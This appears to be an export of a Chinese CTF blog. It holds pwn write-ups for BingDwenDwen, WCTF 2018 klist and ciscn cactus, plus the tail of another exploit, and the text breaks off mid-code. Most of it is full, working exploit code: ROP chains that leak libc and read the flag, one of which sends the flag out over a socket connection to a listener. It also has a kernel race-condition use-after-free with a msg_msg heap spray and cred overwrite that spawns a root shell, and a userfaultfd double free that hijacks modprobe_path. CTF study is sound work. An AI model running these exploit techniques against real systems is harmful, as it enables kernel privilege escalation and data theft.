r.recvuntil(b&#x27;Which?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf8&#x27;))def vuln():    r.recvuntil(b&#x27;4. Quit.&#x27;)    r.sendline(b&#x27;3&#x27;)pop_rdi = 0x0000000000401bb3pop_rsi_r15 = 0x0000000000401bb1main = 0x401A5Ewrite_got = elf.got[&#x27;write&#x27;]write_plt = elf.plt[&#x27;write&#x27;]read_plt = elf.plt[&#x27;read&#x27;]bss = elf.bss()+0x28create(package(1, b&#x27;a&#x27;*(0x1000-24)))create(package(0x1001, b&#x27;a&#x27;*(0x1000-24)))create(package(0x2001, b&#x27;a&#x27;*(0x1000-24)))payload = b&#x27;a&#x27;*(0x3020+0x8-(0x1000-24)*3)+p64(pop_rdi) + \\    p64(1)+p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(main)create(package(0x3001, payload.ljust(0x1000-24, b&#x27;\\x00&#x27;)))vuln()r.recvuntil(b&#x27;Done.\\n&#x27;)write_addr = u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))libc_base = write_addr+libc.symbols[&#x27;write&#x27;]open_addr = libc_base+libc.symbols[&#x27;open&#x27;]pop_rdx = libc_base+next(libc.search(asm(&#x27;pop rdx\\nret&#x27;, arch=&#x27;amd64&#x27;)))pop_rsi = libc_base+next(libc.search(asm(&#x27;pop rsi\\nret&#x27;, arch=&#x27;amd64&#x27;)))delete(0)delete(1)delete(2)delete(3)create(package(1, b&#x27;a&#x27;*(0x1000-24)))create(package(0x1001, b&#x27;a&#x27;*(0x1000-24)))create(package(0x2001, b&#x27;a&#x27;*(0x1000-24)))payload = b&#x27;a&#x27;*(0x3020+0x8-(0x1000-24)*3-6) + p64(pop_rdi) + \\    p64(0)+p64(pop_rsi)+p64(bss)+p64(pop_rdx)+p64(0x5)+p64(read_plt)payload += p64(pop_rdi)+p64(bss)+p64(pop_rsi)+p64(0)+p64(open_addr)payload += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx)+p64(0x30)+p64(read_plt)payload += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(bss) + \\    p64(pop_rdx)+p64(0x30)+p64(write_plt)create(package(0x3001, payload.ljust(0x1000-24, b&#x27;\\x00&#x27;)))gdb.attach(r)vuln()r.send(b&#x27;flag\\x00&#x27;)r.interactive()\n\nBingDwenDwen看似是一个简单的栈溢出，但是这道题关闭了三个基本的IO流，所以没法泄漏没法多次什么的，需要用到反弹shell。而且题目又开了沙箱，所以只能使用orw然后将结果写入socket流。\n主要流程：open(flag,0) -&gt; read(fd,flag_addr,0x30) -&gt; socket(AF_INET, SOCK_STREAM, IPPROTO_IP) -&gt; dup2(soc,2) -&gt; connect(soc, (struct sockaddr *)&amp;serv_addr,sizeof(struct sockaddr_in)) -&gt;  write(2,flag,0x30)。官方的wp写的也很清楚。\nfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.log_level = &#x27;debug&#x27;pop_rdi = 0x0000000000401356pop_rsi = 0x0000000000401358pop_rdx = 0x0000000000401354pop_rax = 0x000000000040135asyscall_ret = 0x0000000000401351mov_rdi_rcx = 0x000000000040135fpush_rax_pop_rcx = 0x40135Cbingdwendwen = 0x403700flag_addr = bingdwendwen+0x1b0ip_port = bingdwendwen+0x1c0payload = b&#x27;a&#x27;*0x10+p64(pop_rdi)+p64(flag_addr) + \\    p64(pop_rsi)+p64(0)+p64(pop_rax)+p64(2)+p64(syscall_ret)# open(flag,0)payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx) + \\    p64(pop_rsi)+p64(flag_addr+0x20)+p64(pop_rdx) + \\    p64(0x30)+p64(pop_rax)+p64(0)+p64(syscall_ret)# read(fb,flag,0x30)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(1)+p64(pop_rdx) + \\    p64(0)+p64(pop_rax)+p64(41)+p64(syscall_ret)# socket(2, 1, 0)payload += p64(push_rax_pop_rcx)+p64(mov_rdi_rcx)+p64(pop_rsi) + \\    p64(2)+p64(pop_rax)+p64(33)+p64(syscall_ret)# dup2(soc, 2)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(ip_port) + \\    p64(pop_rdx)+p64(16)+p64(pop_rax)+p64(42)+p64(syscall_ret)# connect(2, serv_addr, 16)payload += p64(pop_rdi)+p64(2)+p64(pop_rsi)+p64(flag_addr+0x20) + \\    p64(pop_rdx)+p64(0x30)+p64(pop_rax)+p64(1)+p64(syscall_ret)# write(2,flag,0x30)payload = payload.ljust(0x1b0, b&#x27;\\x00&#x27;)+b&#x27;./flag&#x27;payload = payload.ljust(0x1c0, b&#x27;\\x00&#x27;)+p64(0x0100007fe8030002)# gdb.attach(r)r.send(payload)r.interactive()\n\n这里的0x0100007fe8030002分开来看是0x0100007f =&gt; 127.0.0.1，0xe803 =&gt; 1000，0x0002 =&gt; AF_INET\n然后在服务器运行\nimport socketserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server.bind((&#x27;localhost&#x27;, 1000))server.listen(1)while True:    conn, addr = server.accept()    try:        print(conn.recv(1024))    except Exception as e:        conn.close()\n\n今天先复现三个了，肝的太晚了！\n","categories":["比赛复现"],"tags":["pwn"]},{"title":"WCTF 2018 klist","url":"/2022/08/07/WCTF-2018-klist/","content":"题目分析题目实现的功能很容易看出来\n__int64 __fastcall list_ioctl(__int64 a1, unsigned int a2, __int64 a3)&#123;    if ( a2 == 0x1338 )        return select_item(a1, a3);    if ( a2 &lt;= 0x1338 )    &#123;        if ( a2 == 0x1337 )            return add_item(a3);    &#125;    else    &#123;        if ( a2 == 0x1339 )            return remove_item(a3);        if ( a2 == 0x133A )            return list_head(a3);    &#125;    return -22LL;&#125;\n\n主要实现了对堆块的申请，释放，读写\n__int64 __fastcall add_item(__int64 a1)&#123;    __int64 v1; // rax    __int64 size; // rdx    __int64 v3; // rsi    __int64 chunk; // rbx    __int64 v5; // rax    __int64 v7[3]; // [rsp+0h] [rbp-18h] BYREF    if ( copy_from_user(v7, a1, 0x10LL) || v7[0] &gt; 0x400uLL )        return -22LL;    v1 = _kmalloc(v7[0] + 0x18, 0x14202C0LL);    size = v7[0];    v3 = v7[1];    *v1 = 1;    chunk = v1;    *(v1 + 8) = size;    if ( copy_from_user(v1 + 0x18, v3, size) )    &#123;        kfree(chunk);        return -22LL;    &#125;    else    &#123;        mutex_lock(&amp;list_lock);        v5 = g_list;        g_list = chunk;        *(chunk + 0x10) = v5;        mutex_unlock(&amp;list_lock);        return 0LL;    &#125;&#125;\n\n在这里可以分析出申请堆块的参数：\nstruct create_chunk_arg&#123;    unsigned long int size;    char *buf;&#125;;\n\n以及堆块的结构：\nstruct chunk&#123;    inuse;    size;    prev;    buf;&#125;\n\n__int64 __fastcall remove_item(__int64 a1)&#123;    __int64 v1; // rax    __int64 v2; // rdx    __int64 v3; // rdi    __int64 v5; // rdi    if ( a1 &gt;= 0 )    &#123;        mutex_lock(&amp;list_lock);        if ( !a1 )        &#123;            v5 = g_list;            if ( g_list )            &#123;                g_list = *(g_list + 16);                put(v5);                mutex_unlock(&amp;list_lock);                return 0LL;            &#125;            goto LABEL_12;        &#125;        v1 = g_list;        if ( a1 != 1 )        &#123;            if ( !g_list )            &#123;                LABEL_12:                mutex_unlock(&amp;list_lock);                return -22LL;            &#125;            v2 = 1LL;            while ( 1 )            &#123;                ++v2;                v1 = *(v1 + 16);                if ( a1 == v2 )                    break;                if ( !v1 )                    goto LABEL_12;            &#125;        &#125;        v3 = *(v1 + 0x10);        if ( v3 )        &#123;            *(v1 + 0x10) = *(v3 + 0x10);            put(v3);            mutex_unlock(&amp;list_lock);            return 0LL;        &#125;        goto LABEL_12;    &#125;    return -22LL;&#125;\n\n在删除函数可以看出来这里并没有直接kfree来进行删除，而是调用了put函数：\n__int64 __fastcall put(volatile signed __int32 *a1)&#123;  __int64 result; // rax  if ( a1 )  &#123;    if ( !_InterlockedDecrement(a1) )      return kfree(a1);  &#125;  return result;&#125;\n\n而这个put函数就是对chunk的inuse位进行减一的操作，如果为0则进行kfree，结合上面的remove函数其中的脱链操作也是没有问题的，不存在UAF\n__int64 __fastcall select_item(__int64 a1, __int64 a2)&#123;    __int64 v2; // rbx    __int64 v3; // rax    __int64 *v4; // rbp    mutex_lock(&amp;list_lock);    v2 = g_list;    if ( a2 &gt; 0 )    &#123;        if ( !g_list )        &#123;            LABEL_8:            mutex_unlock(&amp;list_lock);            return -22LL;        &#125;        v3 = 0LL;        while ( 1 )        &#123;            ++v3;            v2 = *(v2 + 0x10);            if ( a2 == v3 )                break;            if ( !v2 )                goto LABEL_8;        &#125;    &#125;    if ( !v2 )        return -22LL;    get(v2);    mutex_unlock(&amp;list_lock);    v4 = *(a1 + 0xC8);    mutex_lock(v4 + 1);    put(*v4);    *v4 = v2;    mutex_unlock(v4 + 1);    return 0LL;&#125;\n\n再看select函数，这一函数实现的功能是选取一个chunk放到(fd+0xc8)位置。\nunsigned __int64 __fastcall list_head(__int64 a1)&#123;    __int64 v1; // rbx    unsigned __int64 v2; // rbx    mutex_lock(&amp;list_lock);    get(g_list);    v1 = g_list;    mutex_unlock(&amp;list_lock);    v2 = -(copy_to_user(a1, v1, *(v1 + 8) + 0x18LL) != 0) &amp; 0xFFFFFFFFFFFFFFEALL;    put(g_list);    return v2;&#125;\n\nlist_head函数则是取出chunk内容，这里的size是在create时放在堆块中的size。\n漏洞分析题目中题看上去是没有任何问题的，但是在启动脚本中我们可以看到：\n#!/bin/shqemu-system-x86_64 \\    -enable-kvm \\    -cpu kvm64,+smep \\    -kernel ./bzImage \\    -append &quot;console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet kaslr&quot; \\    -initrd ./rootfs.cpio \\    -nographic \\    -m 512M \\    -smp cores=2,threads=2,sockets=1 \\    -monitor /dev/null \\    -nographic \\    -s\n\n启动了两个核心，虽然程序使用了互斥锁但任存在条件竞争漏洞\n在create的入链操作中：\nmutex_lock(&amp;list_lock);v5 = g_list;g_list = chunk;*(chunk + 0x10) = v5;mutex_unlock(&amp;list_lock);\n\n可以看到这里是首先上锁，然后进行操作\nmutex_lock(&amp;list_lock);get(g_list);v1 = g_list;mutex_unlock(&amp;list_lock);v2 = -(copy_to_user(a1, v1, *(v1 + 8) + 0x18LL) != 0) &amp; 0xFFFFFFFFFFFFFFEALL;put(g_list);\n\n然而在list_head函数中是在获取了链中的第一个chunk就会释放锁，并且最后会进行put函数，如果我们能够在释放锁之后，put函数之前让create新建的chunk入链则会让新入链的chunk进入put函数，然而新chunk的inuse位为1，所以就会直接free掉，那么此时就存在了UAF的chunk了。\n漏洞利用这里就接着看read和write函数\n__int64 __fastcall list_read(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;    __int64 *v5; // r13    __int64 v6; // rsi    _QWORD *v7; // rdi    v5 = *(a1 + 0xC8);    mutex_lock(v5 + 1);    v6 = *v5;    if ( *v5 )    &#123;        if ( *(v6 + 8) &lt;= a3 )            a3 = *(v6 + 8);        v7 = v5 + 1;        if ( copy_to_user(a2, v6 + 0x18, a3) )        &#123;            mutex_unlock(v7);            return -22LL;        &#125;        else        &#123;            mutex_unlock(v7);            return a3;        &#125;    &#125;    else    &#123;        mutex_unlock(v5 + 1);        return -22LL;    &#125;&#125;\n\n这里可以看到read函数操作的chunk就是我们在select函数中放到(fd+0xc8)位置的chunk，并且只要我们传入的第三个参数不大于chunk中记录size的位置就可以进行读取\n__int64 __fastcall list_write(__int64 a1, __int64 a2, unsigned __int64 a3)&#123;    __int64 *v4; // rbp    __int64 v5; // rdi    __int64 v6; // rax    _QWORD *v7; // rdi    v4 = *(a1 + 0xC8);    mutex_lock(v4 + 1);    v5 = *v4;    if ( *v4 )    &#123;        if ( *(v5 + 8) &lt;= a3 )            a3 = *(v5 + 8);        v6 = copy_from_user(v5 + 0x18, a2, a3);        v7 = v4 + 1;        if ( v6 )        &#123;            mutex_unlock(v7);            return -22LL;        &#125;        else        &#123;            mutex_unlock(v7);            return a3;        &#125;    &#125;    else    &#123;        mutex_unlock(v4 + 1);        return -22LL;    &#125;&#125;\n\nwrite函数类似于上面的read函数。\n那么我们的思路就是覆盖上面chunk存放size的位置即可了，这样我们就可以实现任意地址写了。那么我们就需要用到堆喷的技术，内核的堆喷我的理解就是申请大量的chunk，那么大概率会一个chunk落在期望的位置上，而这道题目我们期望的位置也就是存在UAF的堆块的位置。这道题因为在init中的限制，这里选择的msgsnd进行堆喷，下面是进行堆喷的使用模板：\n#define BUFF_SIZE 96-48struct &#123;    long mtype;    char mtext[BUFF_SIZE];&#125; msg;memset(msg.mtext, 0x42, BUFF_SIZE-1);msg.mtext[BUFF_SIZE] = 0;msg.mtype = 1;int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0);\n\n在一次msgsnd的过程中会申请一个size为96的chunk，其中前面的48字节为不可控的内容\nstruct msg_msg &#123;\tstruct list_head m_list;\tlong m_type;\tsize_t m_ts;\t\t/* message text size */\tstruct msg_msgseg *next;\tvoid *security;\t/* the actual message follows immediately */&#125;;\n\n好在msg_msg结构体的前16个字节为两个指针，并且后八位正好落在chunk的size位上，那么如果有一个msg_msg结构体落在了我们的UAF的chunk上我们就可以进行任意地址读写了。接着的思路就是提权，在前两篇的kernel文章中提到了三种提权方式，相比较下使用修改cred结构体的提权方式更为简单，不熟悉的朋友可以去看一下 kernel pwn 任意地址读写提升权限[1]  不过这道题目即便是泄露了地址也无法计算当前chunk的地址与cred结构体的地址的偏移所以没法直接使用以前的方法 这里更好的办法是直接根据uid去寻找cred结构体，因为在上面那片文章cred结构体是通过kmem_cache_alloc创建的。\n综上，exp#include &lt;stdio.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;sys/auxv.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#define BUFF_SIZE 96 - 48/*struct chunk&#123;    inuse    size    prev    buf&#125;*/struct create_chunk_arg&#123;    unsigned long int size;    char *buf;&#125;;struct msg&#123;    long mtype;    char mtext[BUFF_SIZE];&#125;;void set_cred_root(char *cred, int len, int id)&#123;    int i;    for (i = 0; i &lt; len; i += 4)    &#123;        if (*(int *)(cred + i) == id)            *(int *)(cred + i) = 0;    &#125;&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            printf(&quot;%d&quot;, i / 2);        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;int myMemmem(char *a, int alen, char *b, int blen)&#123;    int i, j;    for (i = 0; i &lt;= alen - blen; ++i)    &#123;        for (j = 0; j &lt; blen; ++j)        &#123;            if (a[i + j] != b[j])            &#123;                break;            &#125;        &#125;        if (j &gt;= blen)        &#123;            return i;        &#125;    &#125;    return -1;&#125;int main()&#123;    struct create_chunk_arg create_arg;    char *buf = malloc(0x200);    int fd;    char *res = malloc(0x1000);    fd = open(&quot;/dev/klist&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[-]open file error\\n&quot;);        exit(-1);    &#125;    memset(buf, &#x27;a&#x27;, 0x200);    create_arg.size = 96 - 0x18;    create_arg.buf = buf;    ioctl(fd, 0x1337, &amp;create_arg);    if (fork() == 0)    &#123;        for (int i = 0; i &lt; 0x1000; i++)        &#123;            ioctl(fd, 0x1337, &amp;create_arg);            ioctl(fd, 0x133A, res);            if (*(int *)res == 1)            &#123;                printf(&quot;[*]get the UAF chunk!\\n&quot;);                exit(0);            &#125;        &#125;        printf(&quot;[-]gg\\n&quot;);        exit(0);    &#125;    for (int i = 0; i &lt; 0x1500; i++)    &#123;        ioctl(fd, 0x133A, res);    &#125;    if (fork() == 0)    &#123;        for (int i = 0; i &lt; 0x100; i++)        &#123;            struct msg msg;            int i;            memset(msg.mtext, 0x42, BUFF_SIZE - 1);            msg.mtext[BUFF_SIZE] = 0;            msg.mtype = 1;            for (i = 0; i &lt; BUFF_SIZE; i++)                msg.mtext[i] = &#x27;\\xff&#x27;;            int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);            msgsnd(msqid, &amp;msg, sizeof(msg.mtext), 0);        &#125;        exit(0);    &#125;    sleep(3);    memset(res, 0, 0x1000);    ioctl(fd, 0x1338, 0);    read(fd, res, 0x1000);    if (*(unsigned long int *)res == 0x6161616161616161)    &#123;        puts(&quot;[-] cannot realloc the chunk &quot;);        exit(-1);    &#125;    puts(&quot;[+] now we can read everywhere&quot;);    char *mem = malloc(0x300000);    read(fd, mem, 0x300000);    char cred[0x20];    *(size_t *)cred = 0x000003e800000003;    *(size_t *)(cred + 8) = 0x000003e8000003e8;    *(size_t *)(cred + 0x10) = 0x000003e8000003e8;    *(size_t *)(cred + 0x18) = 0x000003e8000003e8;    int found = myMemmem(mem, 0x300000, cred, 0x20);    if (found == -1)    &#123;        puts(&quot;[-]cannot find cred struct !&quot;);        exit(-1);    &#125;    char *final = found + mem;    print_hex(final - 0x8, 0xb0);    set_cred_root(final - 0x8, 0x40, 1000);    print_hex(final - 0x8, 0xb0);    write(fd, mem, found + 0xb0);    if (getuid() == 0)    &#123;        printf(&quot;[+]now you are r00t,enjoy ur shell\\n&quot;);        system(&quot;/bin/sh&quot;);    &#125;    else    &#123;        puts(&quot;[-] there must be something error ... &quot;);        exit(-1);    &#125;    return 0;&#125;\n\n这里就是成功的结果图：\n\n题目我会放在：https://github.com/196082/196082\n\n参考链接：\nhttp://p4nda.top/2018/11/27/wctf-2018-klist/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E5%88%A9%E7%94%A8\nhttps://xz.aliyun.com/t/2814\n","categories":["Linux Kernel"],"tags":["heap spray","Double Fetch"]},{"title":"ciscn cactus复现","url":"/2022/09/22/ciscn-cactus%E5%A4%8D%E7%8E%B0/","content":"其实这道题很简单，但是因为那个d3kheap卡得太久了并且内核版本是5.13所以我默认这道题目的版本也为5.13了，导致我完全没有去想利用userfaultfd，但题目内核实际版本是5.10.102。\n题目分析这里想问佬们一个问题，就是为什么这道题不能够同时打开两个设备。因为我最开始的思路就是打开两个设备造成UAF，但是就是打不开。\nvoid __fastcall kernel_open(__int64 a1, __int64 a2, __int64 a3)&#123;  __int64 v3; // rdi  ((void (__fastcall *)(__int64, __int64, __int64))_fentry__)(a1, a2, a3);  if ( !flags )  &#123;    v3 = kmalloc_caches[8];    flags = 1;    buffer = (char *)kmem_cache_alloc_trace(v3, 0xCC0LL, 0x100LL);    if ( buffer )      kernel_open_cold();  &#125;&#125;\n\nint __fastcall kernel_release(inode *inode, file *filp)&#123;  char **v2; // rax  int result; // eax  _fentry__(inode, filp);  v2 = addrList;  do    *v2++ = 0LL;  while ( v2 != &amp;addrList[0x20] );  kfree(buffer);  result = 0;  flags = 0;  return result;&#125;\n\n然后这道题的主要函数就是ioctl其余的对做题不影响就不提了。\n// local variable allocation has failed, the output may be wrong!__int64 __fastcall kernel_ioctl(file *file, unsigned int cmd, unsigned __int64 arg)&#123;  __int64 v3; // rdx  __int64 result; // rax  __int64 idx_low; // r12  char *v6; // rdi  __int64 v7; // rax  char *v8; // r12  __int64 v9; // rax  __int64 v10; // rdx  unsigned int size; // eax  char *v12; // r13  __int64 v13; // r12  char *buf; // r14  edit_args a4; // [rsp+0h] [rbp-40h] BYREF  unsigned __int64 v16; // [rsp+18h] [rbp-28h]  _fentry__(file, *(_QWORD *)&amp;cmd);  v16 = __readgsqword(0x28u);  result = 0LL;  if ( cmd == 0x30 )  &#123;    if ( !copy_from_user(&amp;a4, v3, 8LL) )    &#123;      if ( delFlags &lt;= 1 &amp;&amp; LODWORD(a4.idx) &lt;= 0x20 )      &#123;        idx_low = LODWORD(a4.idx);        v6 = addrList[LODWORD(a4.idx)];        if ( v6 )        &#123;          kfree(v6);          ++delFlags;          addrList[idx_low] = 0LL;        &#125;      &#125;      return 0LL;    &#125;    return -22LL;  &#125;  if ( cmd == 0x50 )  &#123;    if ( !copy_from_user(&amp;a4, v3, 0x18LL) )    &#123;      if ( editFlags &lt;= 1 )      &#123;        size = a4.size;        if ( LODWORD(a4.size) &gt; 0x400 )          size = 0x400;        if ( LODWORD(a4.idx) &lt;= 0x20 )        &#123;          v12 = addrList[LODWORD(a4.idx)];          if ( v12 )          &#123;            v13 = size;            buf = a4.buf;            _check_object_size(v12, size, 0LL);            if ( !copy_from_user(v12, buf, v13) )            &#123;              ++editFlags;              return 0LL;            &#125;          &#125;        &#125;      &#125;      return 0LL;    &#125;    return -22LL;  &#125;  if ( cmd != 0x20 )    return result;  if ( copy_from_user(&amp;a4, v3, 0x10LL) )    return -22LL;  if ( addFlags &gt; 1 )    return 0LL;  v7 = kmem_cache_alloc_trace(kmalloc_caches[10], 0xCC0LL, 0x400LL);  v8 = (char *)v7;  if ( !v7 )    return 0LL;  v9 = copy_from_user(v7, a4.size, 0x400LL);  if ( v9 )    return 0LL;  while ( 1 )  &#123;    v10 = (int)v9;    if ( !addrList[v9] )      break;    if ( ++v9 == 0x20 )      return 0LL;  &#125;  ++addFlags;  result = 0LL;  addrList[v10] = v8;  return result;&#125;\n\n可以看到这里分别是add，del，edit三个功能。并且不存在直接的漏洞，不过题目没有加锁的操作。\n再就是题目所打开的保护是kaslr，kpti，smep，smap四个保护。\n利用分析构造double free我们要知道的是在slab管理器中的指向。slab-&gt;freelist指向的是我们刚刚free掉的object，然后我们的object中间的某个位置修改为原始是slab-&gt;freelist。\n那么按照题目来看如果我们使用userfaultfd在edit的第二个copy_from_user阻塞进程同时在另一个进程free掉刚刚到object，那么我们在缺陷页处理返回新的页时修改掉object中的指针即可。并且这里采用的方法是partial write。\n泄漏基地址既然有了double free那么后续就很好办了，这里借用上一篇文章中的思路，我们首先申请sk_buff结构体获得object，随后使用pipe_buffer获取同一块object并把ops写到堆上，那么紧接着只需要将pipe_buffer-&gt;ops读出即可。\nmodprobe_path详细可以参考这篇文章：https://cv196082.gitee.io/2022/08/10/starCTF-2019-hackme/\n既然我们有了kernel基地址，那么直接根据偏移获取modprobe_path。同样修改object的指针，构造fake_object指向modprobe_path即可。\n综上，exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;net/if.h&gt;#include &lt;netinet/in.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;stdint.h&gt;#include &lt;sys/prctl.h&gt;#include &lt;sys/types.h&gt;#include &lt;stdio.h&gt;#include &lt;linux/userfaultfd.h&gt;#include &lt;pthread.h&gt;#include &lt;errno.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;signal.h&gt;#include &lt;string.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;sys/ioctl.h&gt;#include &lt;sys/sem.h&gt;#include &lt;semaphore.h&gt;#include &lt;poll.h&gt;#include &lt;time.h&gt;#define SOCKET_NUM 1#define SK_BUFF_NUM 1#define PIPE_NUM 1#define PIPE_NUM2 16struct pipe_buffer&#123;    uint64_t page;    uint32_t offset, len;    uint64_t ops;    uint32_t flags;    uint32_t padding;    uint64_t private;&#125;;struct pipe_buf_operations&#123;    uint64_t confirm;    uint64_t release;    uint64_t try_steal;    uint64_t get;&#125;;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;void RegisterUserfault(void *fault_page, void *handler)&#123;    pthread_t thr;    struct uffdio_api ua;    struct uffdio_register ur;    uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);    ua.api = UFFD_API;    ua.features = 0;    if (ioctl(uffd, UFFDIO_API, &amp;ua) == -1)        errExit(&quot;[-] ioctl-UFFDIO_API&quot;);    ur.range.start = (unsigned long)fault_page;    ur.range.len = 0x1000;    ur.mode = UFFDIO_REGISTER_MODE_MISSING;    if (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == -1)        errExit(&quot;[-] ioctl-UFFDIO_REGISTER&quot;);    int s = pthread_create(&amp;thr, NULL, handler, (void *)uffd);    if (s != 0)        errExit(&quot;[-] pthread_create&quot;);&#125;void *edit_handle(void *arg)&#123;    struct uffd_msg msg;    int fault_cnt = 0;    long uffd;    struct uffdio_copy uffdio_copy;    ssize_t nread;    uffd = (long)arg;    puts(&quot;[+] edit handler created&quot;);    for (;;)    &#123;        struct pollfd pollfd;        int nready;        pollfd.fd = uffd;        pollfd.events = POLLIN;        nready = poll(&amp;pollfd, 1, -1);        puts(&quot;[+] edit handler unblocked&quot;);        if (nready == -1)            errExit(&quot;poll&quot;);        nread = read(uffd, &amp;msg, sizeof(msg));        sleep(2);        if (nread == 0)            errExit(&quot;EOF on userfaultfd!\\n&quot;);        if (nread == -1)            errExit(&quot;read&quot;);        if (msg.event != UFFD_EVENT_PAGEFAULT)            errExit(&quot;Unexpected event on userfaultfd\\n&quot;);        char *page = (char *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);        if (page == MAP_FAILED)        &#123;            errExit(&quot;[-] mmap err&quot;);        &#125;        struct uffdio_copy uc;        // init page        memset(page, 0, sizeof(page));        *(page + 0x201) = 0x64;        uc.src = (unsigned long)page;        uc.dst = (unsigned long)msg.arg.pagefault.address &amp;                 ~(0x1000 - 1);        uc.len = 0x1000;        uc.mode = 0;        uc.copy = 0;        if (ioctl(uffd, UFFDIO_COPY, &amp;uc) == -1)            errExit(&quot;ioctl-UFFDIO_COPY&quot;);        puts(&quot;[+] edit handler done&quot;);        return NULL;    &#125;&#125;struct add_arg&#123;    unsigned long idx;    char *buf;&#125;;struct edit_arg&#123;    unsigned long idx;    unsigned long size;    char *buf;&#125;;struct del_arg&#123;    unsigned long idx;&#125;;int fd;int add(char *buf)&#123;    struct add_arg arg;    arg.idx = 0;    arg.buf = buf;    return ioctl(fd, 0x20, &amp;arg);&#125;int del(unsigned long idx)&#123;    struct del_arg arg;    arg.idx = idx;    return ioctl(fd, 0x30, &amp;arg);&#125;int edit(unsigned long idx, unsigned long size, char *buf)&#123;    struct edit_arg arg;    arg.idx = idx;    arg.size = size;    arg.buf = buf;    return ioctl(fd, 0x50, &amp;arg);&#125;void print_hex(char *buf, int size)&#123;    int i;    puts(&quot;======================================&quot;);    printf(&quot;data :\\n&quot;);    for (i = 0; i &lt; (size / 8); i++)    &#123;        if (i % 2 == 0)        &#123;            if (i / 2 &lt; 10)            &#123;                printf(&quot;%d  &quot;, i / 2);            &#125;            else if (i / 2 &lt; 100)            &#123;                printf(&quot;%d &quot;, i / 2);            &#125;            else            &#123;                printf(&quot;%d&quot;, i / 2);            &#125;        &#125;        printf(&quot; %16llx&quot;, *(size_t *)(buf + i * 8));        if (i % 2 == 1)        &#123;            printf(&quot;\\n&quot;);        &#125;    &#125;    puts(&quot;======================================&quot;);&#125;void prepare_mod()&#123;    system(&quot;mkdir -p /tmp&quot;);    system(&quot;echo &#x27;#!/bin/sh&#x27; &gt; /tmp/copy.sh&quot;);    system(&quot;echo &#x27;cp /flag /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;);    system(&quot;echo &#x27;chmod 777 /tmp/myflag&#x27; &gt;&gt; /tmp/copy.sh&quot;);    system(&quot;chmod +x /tmp/copy.sh&quot;);    system(&quot;echo -e &#x27;\\\\xFF\\\\xFF\\\\xFF\\\\xFF&#x27; &gt; /tmp/dummy&quot;);    system(&quot;chmod +x /tmp/dummy&quot;);&#125;int main()&#123;    char *buf = malloc(0x4000);    char *page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);    unsigned long kernel_base = NULL;    unsigned long kernel_offset = NULL;    unsigned long kernel_addr = NULL;    int sk_sockets[SOCKET_NUM][2];    int pipe_fd[PIPE_NUM][2];    int pipe_fd2[PIPE_NUM2][2];    struct pipe_buffer *pipe_buf_ptr;    char sk_buf[704];    unsigned long modprobe_path;    unsigned long *pointer_buf;    char *flag[0x100];    int flag_fd;    prepare_mod();    for (int i = 0; i &lt; PIPE_NUM2; i++)    &#123;        if (pipe(pipe_fd2[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        // write something to activate it        if (write(pipe_fd2[i][1], &quot;7777pray&quot;, 8) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    for (int i = 0; i &lt; SOCKET_NUM; i++)        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) &lt; 0)            errExit(&quot;failed to create socket pair!&quot;);    fd = open(&quot;/dev/kernelpwn&quot;, O_RDWR);    if (fd &lt; 0)    &#123;        printf(&quot;[x] open 0 kernelpwn error!%d\\n&quot;, fd);        return 0;    &#125;    memset(buf, 0, 0x1000);    add(buf);    RegisterUserfault(page, edit_handle);    clock_t start_t, finish_t;    start_t = clock();    int pid = fork();    if (pid &lt; 0)    &#123;        errExit(&#x27;[-] fork error!&#x27;);    &#125;    else if (pid == 0)    &#123;        puts(&quot;[\\033[34m\\033[1m*\\033[0m] Child process 